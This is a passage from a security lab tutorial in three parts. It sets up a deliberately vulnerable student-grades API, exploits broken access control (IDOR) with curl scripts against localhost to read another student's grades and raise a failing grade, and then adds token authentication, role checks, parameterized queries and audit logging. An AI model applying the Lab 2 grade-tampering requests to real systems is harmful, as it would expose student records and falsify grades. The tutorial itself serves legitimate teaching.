...
### Lab 1: GradeHack - Setup Vulnerable Environment
...
('20223948', 'Ezra', 'ezra@student.edu', 'hashed_password', 'student'),
('20223949', 'Alice', 'alice@student.edu', 'hashed_password', 'student'),
('20223950', 'Bob', 'bob@student.edu', 'hashed_password', 'student'),
('T001', 'Dr. Smith', 'smith@teacher.edu', 'hashed_password', 'teacher');
...
### Lab 2: GradeHack - Exploit the Vulnerability
...
echo "=== Broken Access Control Exploitation Lab ==="
echo ""

# Test 1: View own grades
echo "[Test 1] Viewing own grades..."
curl -s "http://localhost:3000/api/grades?studentid=20223948&subjectid=1293" | jq
echo ""

# Test 2: View another student's grades (IDOR)
echo "[Test 2] Viewing another student's grades (IDOR)..."
curl -s "http://localhost:3000/api/grades?studentid=20223949&subjectid=1293" | jq
echo ""

# Test 3: Change own grade
echo "[Test 3] Changing own grade from F to HD..."
curl -s -X PATCH "http://localhost:3000/api/grades" \
  -H "Content-Type: application/json" \
  -d '{"studentId":"20223948","subjectId":"1293","grade":"HD"}' | jq
echo ""

# Test 4: Verify grade change
echo "[Test 4] Verifying grade change..."
curl -s "http://localhost:3000/api/grades?studentid=20223948&subjectid=1293" | jq
echo ""
...
### Lab 3: GradeHack - Implement Security Controls
...
function authorizeResourceAccess(req, res, next) {
    ...
    if (req.user.id === requestedStudentId || ['teacher', 'admin'].includes(req.user.role)) {
        return next();
    }
...
// SECURE: Get grades with authorization
app.get('/api/grades',
    authenticateToken,
    authorizeResourceAccess,
    async (req, res) => {
        ...
        const [rows] = await connection.execute(
            'SELECT g.*, u.name as student_name FROM grades g JOIN users u ON g.student_id = u.id WHERE g.student_id = ? AND g.subject_id = ?',
            [studentid, subjectid]
        );
...
// SECURE: Update grades (teachers only)
app.patch('/api/grades',
    authenticateToken,
    requireRole(['teacher', 'admin']),
    async (req, res) => {
        ...
        // Update grade
        await connection.execute(
            'UPDATE grades SET grade = ?, updated_by = ? WHERE student_id = ? AND subject_id = ?',
            [grade, req.user.id, studentId, subjectId]
        );
        
        // Audit log
        await connection.execute(
            'INSERT INTO audit_log (user_id, student_id, subject_id, action) VALUES (?, ?, ?, ?)',
            [req.user.id, studentId, subjectId, `Changed grade to ${grade}`]
        );
...
echo "=== Testing Secure Implementation ==="
echo ""

# Login as student
echo "[1] Login as student..."
STUDENT_TOKEN=$(curl -s -X POST "http://localhost:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"ezra@student.edu","password":"password123"}' | jq -r '.token')
echo "Student token: ${STUDENT_TOKEN:0:20}..."
echo ""

# Login as teacher
echo "[2] Login as teacher..."
TEACHER_TOKEN=$(curl -s -X POST "http://localhost:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"smith@teacher.edu","password":"password123"}' | jq -r '.token')
echo "Teacher token: ${TEACHER_TOKEN:0:20}..."
echo ""

# Test 1: Student views own grades (should succeed)
echo "[3] Student viewing own grades (should succeed)..."
curl -s "http://localhost:3000/api/grades?studentid=20223948&subjectid=1293" \
  -H "Authorization: Bearer $STUDENT_TOKEN" | jq
echo ""

# Test 2: Student views another's grades (should fail)
echo "[4] Student viewing another's grades (should fail)..."
curl -s "http://localhost:3000/api/grades?studentid=20223949&subjectid=1293" \
  -H "Authorization: Bearer $STUDENT_TOKEN" | jq
echo ""

# Test 3: Student tries to change grade (should fail)
echo "[5] Student changing own grade (should fail)..."
curl -s -X PATCH "http://localhost:3000/api/grades" \
...
# Test 4: Teacher changes grade (should succeed)
echo "[6] Teacher changing student grade (should succeed)..."
curl -s -X PATCH "http://localhost:3000/api/grades" \
  -H "Authorization: Bearer $TEACHER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"studentId":"20223948","subjectId":"1293","grade":"C"}' | jq
echo ""

# Test 5: Verify grade change
echo "[7] Verifying grade change..."
curl -s "http://localhost:3000/api/grades?studentid=20223948&subjectid=1293" \
  -H "Authorization: Bearer $STUDENT_TOKEN" | jq
echo ""
